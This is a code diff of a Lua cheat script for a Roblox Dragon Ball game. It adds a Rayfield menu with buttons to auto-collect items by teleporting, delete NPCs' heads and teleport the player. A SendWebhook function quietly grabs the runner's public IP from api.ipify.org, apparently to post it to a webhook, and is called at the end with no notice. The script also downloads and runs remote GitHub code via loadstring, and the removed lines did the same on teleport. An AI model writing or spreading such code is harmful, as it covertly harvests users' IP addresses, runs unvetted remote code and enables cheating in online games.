@@ -1,10 +1,12 @@
-local Marketplace = game:GetService('MarketplaceService')
-local Player = game.Players.LocalPlayer
-local TweenService = game:service"TweenService";
+
+local Marketplace = game:GetService('MarketplaceService');
+local Players = game:GetService('Players');
+local Player = Players.LocalPlayer;
+local Character = Player.Character;
+local TweenService = game:GetService("TweenService");
 local Info = TweenInfo.new(15,Enum.EasingStyle.Quad);
 
-
-function sendwebhook()
+function SendWebhook()
 	local ExecutedIP = tostring(game:HttpGet("https://api.ipify.org", true))
 	local OSTime = os.time()
 	local Time = os.date('!*t', OSTime)
@@ -52,91 +54,107 @@ function sendwebhook()
 	};
 end
 
-function tp(...)
+function Teleport(...)
 	local tic_k = tick();
 	local params = {...};
 	local cframe = CFrame.new(params[1],params[2],params[3]);
 	local tween,err = pcall(function()
-		local tween = TweenService:Create(Player.Character["HumanoidRootPart"],Info,{CFrame=cframe});
+		local tween = TweenService:Create(Character["HumanoidRootPart"],Info,{CFrame=cframe});
 		tween:Play();
 	end)
 	if not tween then return err end
 end
 
-
 if game.PlaceId == game.PlaceId then
-	sendwebhook()
-	local NPC = 'No Given.'
-	local Sucessful, Info = pcall(Marketplace.GetProductInfo, Marketplace, game.PlaceId)
-	local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 
-	local Window = OrionLib:MakeWindow({Name = Info.Name, HidePremium = false, SaveConfig = false, ConfigFolder = "OrionTest", IntroEnabled = true, Icon = "rbxassetid://10590477428", IntroText = "Random HUB", IntroIcon = "rbxassetid://10590477428"})
+_G.NPC = "No Given."
 
-	local Tab = Window:MakeTab({
-		Name = "Main",
-		Icon = "rbxassetid://10590477428",
-		PremiumOnly = false
-	})
-	local Section = Tab:AddSection({
-		Name = "Main"
-	})
+local Sucessful, Info = pcall(Marketplace.GetProductInfo, Marketplace, game.PlaceId)
 
-	Tab:AddTextbox({
-		Name = "NPC Name",
-		Callback = function(Value)
-			NPC = Value
-		end
-	})
-
-	Tab:AddButton({
-		Name = "Kill NPC",
-		Callback = function()
-			for _, Npc in pairs(game.Workspace:GetChildren()) do
-				if Npc.Name:match(NPC) then
-					local Head = Npc:FindFirstChild("Head") 
-					if Head then
-						Head:Destroy()
-					end
-				else
-				end
-			end
-		end
-	})
-
-	Tab:AddButton({
-		Name = "Collect Dragons balls",
-		Callback = function()
-			for _,Db in pairs(game.Workspace:GetChildren()) do
-				if Db.Name:match('star') then
-					Player.Character.HumanoidRootPart.CFrame = Db.CFrame
-				end
-			end
-		end
-	})
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
 
 
-	local Tab = Window:MakeTab({
-		Name = "Snakeway",
-		Icon = "rbxassetid://10590477428",
-		PremiumOnly = false
-	})
+local Window = Rayfield:CreateWindow({
+	Name = Info.Name,
+	LoadingTitle = "Loading Please Wait..",
+	LoadingSubtitle = "by Zanta",
+	ConfigurationSaving = {
+		Enabled = true,
+		FolderName = 'ConfigZ', -- Create a custom folder for your hub/game
+		FileName = "Random"
+	},
+})
 
-	Tab:AddButton({
-		Name = "Teleport to Kaio",
-		Callback = function()
-			if game.PlaceId == 4748429613 then
-			tp(-479.316528, 3198.57788, -10069.5693, 1, 0, 0, 0, 1, 0, 0, 0, 1);
+local Tab = Window:CreateTab("Main", 10762499520) -- Title, Image
+
+local Section = Tab:CreateSection("Farm")
+
+local Button = Tab:CreateButton({
+	Name = "Collect Dragon Balls",
+	Callback = function()
+		for _, Db in pairs(game.Workspace:GetChildren()) do 
+            if Db.Name:match('Stars') then
+                Character.HumanoidRootPart.CFrame = Db.CFrame
+                wait(.5)
+            end
+        end
+	end,
+})
+
+
+
+local Label = Tab:CreateLabel("I hope you are enjoying this.")
+
+
+local Input = Tab:CreateInput({
+	Name = "NPC",
+	PlaceholderText = "Name",
+	RemoveTextAfterFocusLost = false,
+	Callback = function(Text)
+		_G.NPC = Text
+	end,
+})
+
+local Button = Tab:CreateButton({
+	Name = "Kill NPC",
+	Callback = function()
+
+		local NPCFind = game.Workspace:FindFirstChild(_G.NPC)
+		
+		if NPCFind then
+			local Head = NPCFind:FindFirstChild("Head")
+			if NPCFind and Head then
+				Head:Destroy()
 			else
-			tp(5234.24316, 363.164673, -7374.52002, 1, 0, 0, 0, 1, 0, 0, 0, 1);
+				Rayfield:Notify({
+					Title = "Error!",
+					Content = "NPC No Found ║ Invalid Name",
+					Duration = 1,
+					Image = 10762499520,
+				})
 			end
 		end
 
-	})
-end
+	end,
+})
 
-local queue_on_teleport =
-queue_on_teleport or
-    syn and
-        syn.queue_on_teleport [[
-       repeat wait() until game:IsLoaded() wait(5) print("ServerHoped or rejoined")
-       loadstring(game:HttpGet('https://raw.githubusercontent.com/xXxBanisherxXx/DBXL/main/Grind.lua'))()]]
+
+local Tab = Window:CreateTab("Snake Way", 10762499520)
+
+local Section = Tab:CreateSection("Teleport")
+
+
+local Button = Tab:CreateButton({
+	Name = "Teleport to Kaio",
+	Callback = function()
+		if game.PlaceId == 4748429613 then
+			    Teleport(-479.316528, 3198.57788, -10069.5693, 1, 0, 0, 0, 1, 0, 0, 0, 1);
+			else
+				Teleport(5234.24316, 363.164673, -7374.52002, 1, 0, 0, 0, 1, 0, 0, 0, 1);
+			end
+	end,
+})
+
+
+SendWebhook()
+end
